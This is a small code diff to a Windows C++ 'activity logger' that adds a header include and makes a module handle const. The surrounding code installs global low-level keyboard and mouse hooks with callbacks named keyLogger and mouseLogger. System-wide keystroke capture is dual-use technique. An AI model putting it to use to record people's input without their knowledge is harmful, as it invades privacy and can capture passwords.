@@ -1,4 +1,5 @@
 #include "stdafx.h"
+#include "HookService.h"
 #include <windows.h>
 
 HHOOK hKeyboardHook;
@@ -49,7 +50,7 @@ void msgLoop()
 
 void WINAPI runActivityLogger()
 {
-	HINSTANCE hins = GetModuleHandle(nullptr);
+	const HINSTANCE hins = GetModuleHandle(nullptr);
 	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(keyLogger), hins, 0);
 	hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, HOOKPROC(mouseLogger), hins, 0);
 
